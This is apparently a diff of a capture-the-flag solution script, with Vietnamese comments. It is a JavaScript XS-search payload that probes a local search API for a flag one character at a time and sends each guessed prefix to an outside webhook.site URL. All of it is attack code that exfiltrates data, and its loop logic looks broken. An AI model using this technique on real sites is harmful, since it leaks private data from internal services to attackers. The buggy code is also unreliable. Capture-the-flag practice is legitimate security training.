@@ -1,11 +1,29 @@
 <script>
-// Tạo thẻ script
-    let script = document.createElement('script');
-    script.src = 'http://127.0.0.1:1337/api/entries/search?q=HTB';
-    script.onload = () => {
-        // Thực hiện hành động sau khi script được tải thành công
-        fetch('https://webhook.site/863fb66b-7f91-4ef5-98cc-66a4ee77d282/success');
-}
-    script.onerror = () => { };
-    document.head.appendChild(script);
+    // Tạo biến chứa các tất cả các ký tự 
+    let chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_+[]{}|;:,.<>?';
+    let flag = 'HTB{';
+
+    // Tạo 1 hàm để loop các ký tự trên
+    const generate = (char) => {
+        let bool = false;
+        let script = document.createElement('script');
+        //encodeURIComponent() là hàm để mã hóa ký tự thành dạng URL
+        script.src = 'http://127.0.0.1:1337/api/entries/search?q=' + encodeURIComponent(flag + char); 
+        script.onload = () => {
+            // Thực hiện hành động sau khi script được tải thành công
+            fetch('https://webhook.site/863fb66b-7f91-4ef5-98cc-66a4ee77d282/' + flag + char);
+        }
+        script.onerror = () => { };
+        document.head.appendChild(script);
+        return bool;
+    }
+    // Tạo vòng lặp để kiểm tra các ký tự
+    for (let i = 0; i < chars.length; i++) {
+        // Gọi hàm generate với ký tự hiện tại
+        if (generate(chars[i])) {
+            // Nếu hàm trả về true, thì dừng vòng lặp
+            i=0;
+        };
+    }
+    
 </script>
